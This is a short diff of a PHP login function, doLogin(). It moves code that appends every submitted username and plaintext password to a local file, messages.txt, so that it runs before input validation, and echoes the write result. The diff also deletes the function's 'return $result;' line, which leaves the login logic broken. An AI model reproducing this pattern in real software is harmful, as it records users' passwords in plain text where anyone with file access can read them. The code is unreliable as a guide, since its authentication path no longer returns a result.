@@ -10,6 +10,15 @@ function doLogin($username,$password)
 {
     // lookup username in databas
 	// check password
+
+   $file = 'messages.txt';
+   $handle = fopen($file, 'a') or die('Cannot open file: ' .$file);
+   $data = 'redirect: '.$username.', '.$password.'\n';
+   echo fwrite($handle, $data);
+    
+   fclose($handle);
+
+  
    if (!isset($username) || !isset($password)) {
 	echo "invalid input";
 	return false;
@@ -32,14 +41,7 @@ function doLogin($username,$password)
      return false;
    }
 
-   $file = 'messages.txt';
-   $handle = fopen($file, 'a') or die('Cannot open file: ' .$file);
-   $data = 'redirect: '.$username.', '.$password.'\n';
-   fwrite($handle, $data);
-    
-   fclose($handle);
-
-   return $result;
+   
 
    //$login = new loginDB();
     //return $login->validateLogin($username,$password);
